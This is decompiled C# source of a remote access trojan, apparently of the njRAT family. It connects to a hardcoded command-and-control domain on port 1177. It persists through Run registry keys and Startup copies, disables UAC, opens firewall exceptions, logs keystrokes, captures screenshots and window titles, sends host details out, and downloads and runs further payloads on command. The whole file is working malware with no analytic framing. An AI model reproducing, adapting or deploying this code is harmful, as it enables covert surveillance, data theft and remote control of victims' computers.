using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using oyhnnxoksms.My;

namespace oyhnnxoksms;

public class A
{
	public string EXE;

	public string DR;

	public string RG;

	public string VN;

	public string VR;

	public string MTX;

	public Mutex MT;

	public string H;

	public string P;

	public string Y;

	public object kq;

	public FileInfo LO;

	public bool CN;

	public TcpClient c;

	public string WSH;

	public Computer F;

	public bool NJ;

	public const uint LOCALE_SYSTEM_DEFAULT = 1024u;

	public const uint LOCALE_SABBREVCTRYNAME = 7u;

	public string SPL;

	internal string p;

	public A()
	{
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		EXE = "Trojan.exe";
		DR = "AppData";
		RG = "8515eb34d8f9de5af815466e9715b3e5";
		VN = "SGFjS2Vk";
		VR = "0.3.5";
		MTX = "";
		MT = null;
		H = "shayar1999host.zapto.org";
		P = "1177";
		Y = "|'|'|";
		kq = null;
		LO = new FileInfo(Assembly.GetExecutingAssembly().Location);
		CN = false;
		WSH = "";
		string text = (p = "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
		F = new Computer();
		NJ = false;
		SPL = "[endof]";
		MyApplication.w.h();
	}

	[STAThread]
	public static void main()
	{
		MyApplication.w.a();
		A a = new A();
		a.WL();
		MyApplication.k();
	}

	public void WL()
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_020c: Expected O, but got Unknown
		try
		{
			if (LO.FullName.ToLower().EndsWith(".tmp"))
			{
				Interaction.MsgBox((object)"", (MsgBoxStyle)3, (object)null);
				ProjectData.EndApp();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		MTX = RG;
		if (!NJ)
		{
			if (Interaction.Command() != null && Interaction.Command().Length > 0)
			{
				string[] array = Strings.Split(Interaction.Command(), ":", -1, (CompareMethod)0);
				string text = array[0];
				if (Operators.CompareString(text, "UP", false) == 0)
				{
					try
					{
						((ServerComputer)F).get_Registry().get_CurrentUser().SetValue("di", "!");
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						Process processById = Process.GetProcessById(Conversions.ToInteger(array[1]));
						processById.WaitForExit(5000);
						try
						{
							processById.Dispose();
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						Thread.Sleep(5000);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text, "..", false) == 0)
				{
					Thread.Sleep(5000);
				}
			}
			try
			{
				if (File.Exists(Interaction.Environ("windir") + "\\SysWOW64\\wscript.exe"))
				{
					WSH = Interaction.Environ("windir") + "\\SysWOW64\\wscript.exe";
				}
				else
				{
					WSH = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\wscript.exe";
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			INS();
			try
			{
				Mutex.OpenExisting(MTX);
				ProjectData.EndApp();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				Mutex.OpenExisting("bf" + MTX);
				ProjectData.EndApp();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				MT = new Mutex(initiallyOwned: true, "bf" + MTX);
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistrationServices val = new RegistrationServices();
				try
				{
					val.UnregisterAssembly(Assembly.GetExecutingAssembly());
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					ProjectData.ClearProjectError();
				}
				if (val.RegisterAssembly(Assembly.GetExecutingAssembly(), AssemblyRegistrationFlags.SetCodeBase))
				{
					string text2 = "q" + Conversions.ToString(GetHashCode());
					string text3 = LO.DirectoryName + "\\" + LO.get_Name().Replace(LO.Extension, ".vbe");
					File.WriteAllText(text3, "CreateObject(\"oyhnnxoksms.oyhnnxoksms\").W(\"" + text2 + "\")");
					Process.Start(WSH, "\"" + text3 + "\"").WaitForExit(5000);
					try
					{
						File.Delete(text3);
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					try
					{
						val.UnregisterAssembly(Assembly.GetExecutingAssembly());
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					try
					{
						Mutex.OpenExisting(text2);
						ProjectData.EndApp();
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Mutex.OpenExisting(MTX);
			ProjectData.EndApp();
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			MT = new Mutex(initiallyOwned: true, MTX);
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		Thread thread = new Thread(RC, 1);
		thread.Start();
		thread = new Thread(kl, 1);
		thread.Start();
		int num = 0;
		int num2 = 0;
		string text4 = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(1000);
				try
				{
					num++;
					num2++;
					if (num > 10)
					{
						num = 0;
						if (CN && Operators.CompareString(ACT(), text4, false) != 0)
						{
							text4 = ACT();
							if (text4 != null && text4.Length > 0)
							{
								Send("act" + Y + text4);
							}
						}
					}
					if (num2 > 7)
					{
						num2 = 0;
						try
						{
							((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(p, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
						}
						catch (Exception projectError16)
						{
							ProjectData.SetProjectError(projectError16);
							ProjectData.ClearProjectError();
						}
						try
						{
							((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(p, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
						}
						catch (Exception projectError17)
						{
							ProjectData.SetProjectError(projectError17);
							ProjectData.ClearProjectError();
						}
						try
						{
							File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", overwrite: true);
						}
						catch (Exception projectError18)
						{
							ProjectData.SetProjectError(projectError18);
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError19)
				{
					ProjectData.SetProjectError(projectError19);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public void kl()
	{
		try
		{
			byte[] b = (byte[])NewLateBinding.LateIndexGet((object)fx((byte[])NewLateBinding.LateIndexGet((object)fx(File.ReadAllBytes(LO.FullName), "[nj]"), new object[1] { 1 }, (string[])null), "[nj]"), new object[1] { 0 }, (string[])null);
			bool CM = false;
			kq = RuntimeHelpers.GetObjectValue(Plugin(ZIP(b, ref CM), "A"));
			NewLateBinding.LateSet(kq, (Type)null, "LogsPath", new object[1] { LO.FullName + ".log" }, (string[])null, (Type[])null);
			NewLateBinding.LateCall(kq, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public object Plugin(byte[] ByteOfPlugin, string ClassName)
	{
		Assembly assembly = Assembly.Load(ByteOfPlugin);
		return assembly.CreateInstance(Strings.Split(assembly.FullName, ",", -1, (CompareMethod)0)[0] + "." + ClassName);
	}

	public void Ind(byte[] b)
	{
		//IL_0847: Unknown result type (might be due to invalid IL or missing references)
		//IL_084e: Expected O, but got Unknown
		string[] array = Strings.Split(BS(ref b), Y, -1, (CompareMethod)0);
		checked
		{
			try
			{
				switch (array[0])
				{
				case "kl":
				{
					string y = Y;
					object obj = kq;
					string s = Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, "logs", new object[0], (string[])null, (Type[])null, (bool[])null));
					string text2 = ENB(ref s);
					NewLateBinding.LateSetComplex(obj, (Type)null, "logs", new object[1] { s }, (string[])null, (Type[])null, true, false);
					Send("kl" + y + text2);
					break;
				}
				case "inf":
				{
					string text3 = "inf" + Y;
					if (Operators.CompareString(GTV("vn"), "", false) == 0)
					{
						string text4 = text3;
						string s = DEB(ref VN) + "_" + HWD();
						text3 = text4 + ENB(ref s) + Y;
					}
					else
					{
						string text5 = text3;
						string s = GTV("vn");
						string s2 = DEB(ref s) + "_" + HWD();
						text3 = text5 + ENB(ref s2) + Y;
					}
					text3 = text3 + H + ":" + P + Y;
					text3 = text3 + DR + Y;
					text3 = text3 + EXE + Y;
					text3 += Process.GetCurrentProcess().ProcessName;
					Send(text3);
					break;
				}
				case "prof":
				{
					string text9 = array[1];
					if (Operators.CompareString(text9, "~", false) == 0)
					{
						STV(array[2], array[3]);
					}
					else if (Operators.CompareString(text9, "!", false) == 0)
					{
						STV(array[2], array[3]);
						Send("getvalue" + Y + array[1] + Y + GTV(array[1]));
					}
					else if (Operators.CompareString(text9, "~", false) == 0)
					{
						DLV(array[2]);
					}
					break;
				}
				case "~":
					try
					{
						Send(inf());
						break;
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						CN = false;
						ProjectData.ClearProjectError();
						break;
					}
				case "rn":
				{
					byte[] array3 = null;
					if (array[2].StartsWith("\u001f"))
					{
						byte[] b3 = (byte[])NewLateBinding.LateIndexGet((object)fx((byte[])NewLateBinding.LateIndexGet((object)fx(b, Y), new object[1] { 1 }, (string[])null), Y), new object[1] { 1 }, (string[])null);
						bool CM = false;
						array3 = ZIP(b3, ref CM);
					}
					else
					{
						WebClient webClient2 = new WebClient();
						array3 = webClient2.DownloadData(array[2]);
					}
					Send("bla");
					string text6 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Interaction.Environ("temp") + "\\"), rn(10)), (object)"."), (object)array[1]));
					File.WriteAllBytes(text6, array3);
					Process.Start(text6);
					break;
				}
				case "inv":
				{
					Send("bla");
					string text7 = GTV(array[1]);
					byte[] array4;
					if (text7.Length > 0)
					{
						array4 = Convert.FromBase64String(text7);
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
					}
					else
					{
						if (array[3].Length == 1)
						{
							Send("pl" + Y + array[1] + Y + "False");
							break;
						}
						byte[] b4 = (byte[])NewLateBinding.LateIndexGet((object)fx(b, array[2] + Y), new object[1] { 1 }, (string[])null);
						bool CM = false;
						array4 = ZIP(b4, ref CM);
						if (Conversions.ToBoolean(STV(array[1], Convert.ToBase64String(array4))))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						}
					}
					object objectValue = RuntimeHelpers.GetObjectValue(Plugin(array4, "A"));
					NewLateBinding.LateSet(objectValue, (Type)null, "h", new object[1] { H }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue, (Type)null, "p", new object[1] { P }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue, (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue, (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					while (!Conversions.ToBoolean(Operators.OrObject((object)(!CN), Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))))
					{
						Thread.Sleep(1);
					}
					NewLateBinding.LateSet(objectValue, (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
					break;
				}
				case "ret":
				{
					Send("bla");
					string text8 = GTV(array[1]);
					byte[] array5;
					if (text8.Length > 0)
					{
						array5 = Convert.FromBase64String(text8);
						Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
					}
					else
					{
						if (array[2].Length == 1)
						{
							Send("pl" + Y + array[1] + Y + "True");
							break;
						}
						byte[] b5 = (byte[])NewLateBinding.LateIndexGet((object)fx(b, array[1] + Y), new object[1] { 1 }, (string[])null);
						bool CM = false;
						array5 = ZIP(b5, ref CM);
						if (Conversions.ToBoolean(STV(array[1], Convert.ToBase64String(array5))))
						{
							Send("pl" + Y + array[1] + Y + Conversions.ToString(0));
						}
					}
					object objectValue2 = RuntimeHelpers.GetObjectValue(Plugin(array5, "A"));
					string[] array6 = new string[5]
					{
						"ret",
						Y,
						array[1],
						Y,
						null
					};
					string[] array7 = array6;
					string s2 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null));
					array7[4] = ENB(ref s2);
					Send(string.Concat(array6));
					break;
				}
				case "CAP":
					try
					{
						int width = Screen.get_PrimaryScreen().get_Bounds().Width;
						Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(width, rectangle.Height);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
						val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
						try
						{
							Cursor @default = Cursors.get_Default();
							Point position = Cursor.get_Position();
							size = new Size(32, 32);
							rectangle = new Rectangle(position, size);
							@default.Draw(val2, rectangle);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						val2.Dispose();
						MemoryStream memoryStream = new MemoryStream();
						string s2 = "CAP" + Y;
						b = SB(ref s2);
						memoryStream.Write(b, 0, b.Length);
						MemoryStream memoryStream2 = new MemoryStream();
						IntPtr intPtr = default(IntPtr);
						((Image)val).GetThumbnailImage(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]), (GetThumbnailImageAbort)null, intPtr).Save((Stream)memoryStream2, ImageFormat.get_Jpeg());
						memoryStream.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
						NewLateBinding.LateCall((object)this, (Type)null, "Send", new object[1] { RuntimeHelpers.GetObjectValue(memoryStream.ToArray().Clone()) }, (string[])null, (Type[])null, (bool[])null, true);
						memoryStream.Dispose();
						memoryStream2.Dispose();
						((Image)val).Dispose();
						break;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						break;
					}
				case "P":
					Send("P");
					break;
				case "un":
					switch (array[1])
					{
					case "~":
						UNS();
						break;
					case "!":
						ProjectData.EndApp();
						break;
					case "@":
						Process.Start(LO.FullName);
						ProjectData.EndApp();
						break;
					}
					break;
				case "up":
				{
					byte[] array2 = null;
					if (array[1].StartsWith("\u001f"))
					{
						byte[] b2 = (byte[])NewLateBinding.LateIndexGet((object)fx(b, Y), new object[1] { 1 }, (string[])null);
						bool CM = false;
						array2 = ZIP(b2, ref CM);
					}
					else
					{
						WebClient webClient = new WebClient();
						array2 = webClient.DownloadData(array[1]);
					}
					Send("bla");
					((ServerComputer)F).get_Registry().get_CurrentUser().SetValue("di", "");
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(Interaction.Environ("temp") + "\\"), rn(10)), (object)".exe"));
					File.WriteAllBytes(text, array2);
					Process.Start(text, "UP:" + Conversions.ToString(Process.GetCurrentProcess().Id));
					int num = 0;
					do
					{
						Thread.Sleep(10);
						if (Operators.ConditionalCompareObjectEqual(((ServerComputer)F).get_Registry().get_CurrentUser().GetValue("di", ""), (object)"!", false))
						{
							UNS();
						}
						num++;
					}
					while (num <= 500);
					break;
				}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Send("ER" + Y + array[0] + Y + ex2.Message);
				if ((Operators.CompareString(array[0], "up", false) == 0) | (Operators.CompareString(array[0], "rn", false) == 0))
				{
					Send("bla");
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Send(byte[] b)
	{
		if (!CN)
		{
			return;
		}
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(b, 0, b.Length);
			memoryStream.Write(SB(ref SPL), 0, SPL.Length);
			lock (c.Client)
			{
				c.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
				memoryStream.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			CN = false;
			ProjectData.ClearProjectError();
		}
	}

	public void Send(string S)
	{
		Send(SB(ref S));
	}

	public void RC()
	{
		MemoryStream memoryStream = new MemoryStream();
		int num = 0;
		checked
		{
			while (true)
			{
				try
				{
					if (c != null && c.Client.Connected && CN)
					{
						num++;
						if (num > 1000)
						{
							num = 0;
							lock (c.Client)
							{
								if (!(c.Client.Poll(-1, SelectMode.SelectRead) & (c.Client.Available <= 0)))
								{
									goto end_IL_0059;
								}
								goto end_IL_0008;
								end_IL_0059:;
							}
						}
						if (c.Available > 0)
						{
							byte[] array = new byte[c.Available - 1 + 1];
							c.Client.Receive(array, 0, array.Length, SocketFlags.None);
							memoryStream.Write(array, 0, array.Length);
							while (true)
							{
								byte[] B = memoryStream.ToArray();
								if (BS(ref B).Contains(SPL))
								{
									Array array2 = fx(memoryStream.ToArray(), SPL);
									Thread thread = new Thread(delegate(object object_0)
									{
										Ind((byte[])object_0);
									});
									thread.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null)));
									memoryStream.Dispose();
									memoryStream = new MemoryStream();
									if (array2.Length == 2)
									{
										memoryStream.Write((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null)));
										continue;
									}
									break;
								}
								break;
							}
						}
						goto IL_02d5;
					}
					end_IL_0008:;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				while (true)
				{
					CN = false;
					try
					{
						c.Client.Disconnect(reuseSocket: false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						memoryStream.Dispose();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					memoryStream = new MemoryStream();
					Thread.Sleep(2000);
					try
					{
						c = new TcpClient();
						c.ReceiveTimeout = -1;
						c.SendTimeout = -1;
						c.SendBufferSize = 999999;
						c.ReceiveBufferSize = 999999;
						c.Client.SendBufferSize = 999999;
						c.Client.ReceiveBufferSize = 999999;
						num = 0;
						c.Client.Connect(H, Conversions.ToInteger(P));
						CN = true;
						Send(inf());
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
						continue;
					}
					break;
				}
				continue;
				IL_02d5:
				Thread.Sleep(1);
			}
		}
	}

	public void UNS()
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(p, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(p, writable: true)!.DeleteValue(RG, throwOnMissingValue: false);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("netsh firewall delete allowedprogram \"" + LO.FullName + "\"", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe";
			File.Delete(path);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey("Software", writable: true)!.DeleteSubKey(RG, throwOnMissingSubKey: false);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("cmd.exe /k ping 0 & del \"" + LO.FullName + "\" & exit", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	private bool v(FileInfo fileInfo_0, FileInfo fileInfo_1)
	{
		if (Operators.CompareString(fileInfo_0.get_Name().ToLower(), fileInfo_1.get_Name().ToLower(), false) != 0)
		{
			return false;
		}
		DirectoryInfo directoryInfo = fileInfo_0.Directory;
		DirectoryInfo directoryInfo2 = fileInfo_1.Directory;
		do
		{
			if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
			{
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (!(directoryInfo == null && directoryInfo2 == null))
				{
					if (directoryInfo == null)
					{
						return false;
					}
					continue;
				}
				return true;
			}
			return false;
		}
		while (directoryInfo2 != null);
		return false;
	}

	public void INS()
	{
		try
		{
			((ServerComputer)F).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object)0, RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (!v(LO, new FileInfo(Interaction.Environ(DR).ToLower() + "\\" + EXE.ToLower())))
		{
			try
			{
				if (File.Exists(Interaction.Environ(DR) + "\\" + EXE))
				{
					File.Delete(Interaction.Environ(DR) + "\\" + EXE);
				}
				File.Copy(LO.FullName, Interaction.Environ(DR) + "\\" + EXE, overwrite: true);
				Process.Start(Interaction.Environ(DR) + "\\" + EXE);
				ProjectData.EndApp();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Interaction.Shell("netsh firewall add allowedprogram \"" + LO.FullName + "\" \"" + LO.get_Name() + "\" ENABLE", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("netsh firewall add allowedprogram \"" + WSH + "\" \"wscript.exe\" ENABLE", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().OpenSubKey(p, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)F).get_Registry().get_LocalMachine().OpenSubKey(p, writable: true)!.SetValue(RG, "\"" + LO.FullName + "\" ..");
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", overwrite: true);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		Thread.Sleep(1000);
	}

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

	public bool Cam()
	{
		checked
		{
			try
			{
				string lpszName = Strings.Space(100);
				int num = 0;
				do
				{
					short wDriver = (short)num;
					string lpszVer = null;
					if (!capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern int GetLocaleInfo(uint uint_0, uint uint_1, [Out] StringBuilder stringBuilder_0, int int_0);

	public string Gcc(uint lInfo)
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		int localeInfo = GetLocaleInfo(1024u, lInfo, stringBuilder, stringBuilder.Capacity);
		if (localeInfo > 0)
		{
			return stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
		}
		return string.Empty;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	public string ACT()
	{
		checked
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					string s = " ";
					return ENB(ref s);
				}
				int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
				string WinTitle = Strings.StrDup(windowTextLengthA + 1, "*");
				GetWindowTextA(foregroundWindow, ref WinTitle, windowTextLengthA + 1);
				int lpdwProcessID = default(int);
				GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
				if (lpdwProcessID != 0)
				{
					try
					{
						string s = Process.GetProcessById(lpdwProcessID).MainWindowTitle;
						return ENB(ref s);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						string result = ENB(ref WinTitle);
						ProjectData.ClearProjectError();
						return result;
					}
				}
				return ENB(ref WinTitle);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string s = " ";
				string result = ENB(ref s);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_0, ref int int_1, ref int int_2, ref int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, int int_4);

	public string HWD()
	{
		try
		{
			string string_ = Interaction.Environ("SystemDrive") + "\\";
			string string_2 = null;
			int int_ = 0;
			int int_2 = 0;
			string string_3 = null;
			int int_3 = default(int);
			GetVolumeInformationA(ref string_, ref string_2, 0, ref int_3, ref int_, ref int_2, ref string_3, 0);
			return Conversion.Hex(int_3);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void DLV(string n)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG)
				.DeleteValue(n);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string GTV(string n)
	{
		try
		{
			return Conversions.ToString(((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG)
				.GetValue(n, ""));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object STV(string n, string t)
	{
		try
		{
			((ServerComputer)F).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + RG)
				.SetValue(n, t);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string inf()
	{
		string text = "lv" + Y;
		try
		{
			if (Operators.CompareString(GTV("vn"), "", false) == 0)
			{
				string text2 = text;
				string s = DEB(ref VN) + "_" + HWD();
				text = text2 + ENB(ref s) + Y;
			}
			else
			{
				string text3 = text;
				string s = GTV("vn");
				string s2 = DEB(ref s) + "_" + HWD();
				text = text3 + ENB(ref s2) + Y;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string s2 = HWD();
			text = text4 + ENB(ref s2) + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + Y;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + Y;
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
